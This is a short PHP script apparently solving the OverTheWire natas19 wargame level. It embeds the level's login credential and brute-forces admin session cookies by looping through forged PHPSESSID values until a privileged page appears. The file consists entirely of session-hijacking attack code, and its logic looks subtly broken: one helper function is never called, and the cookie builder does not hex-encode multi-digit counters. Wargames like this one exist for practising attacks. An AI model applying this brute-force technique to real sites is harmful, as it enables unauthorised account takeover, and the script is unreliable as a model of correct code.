<?php
$test = function () {
    $ch = curl_init('http://natas19.natas.labs.overthewire.org/index.php?username=admin&password=username%debug=1');
    curl_setopt($ch, CURLOPT_USERPWD, 'natas19:8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    preg_match_all('/PHPSESSID=3(\w+)2d61646d696e/', $output, $matches);

    return $matches[1][0] ?? '';
};

$check = function ($sessionId) {
    $ch = curl_init('http://natas19.natas.labs.overthewire.org/index.php?debug=1');
    curl_setopt($ch, CURLOPT_USERPWD, 'natas19:8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID=3' . $sessionId . '2d61646d696e');

    $output = curl_exec($ch);
    curl_close($ch);
    if (
        strpos($output, 'You are logged in as a regular user') === false
        && strpos($output, 'Please login') === false
    ) {
        var_export($output);
        die;
    }
};

for ($i = 0; $i < 40000; $i++) {
    echo "$i\n";
    $check($i);
}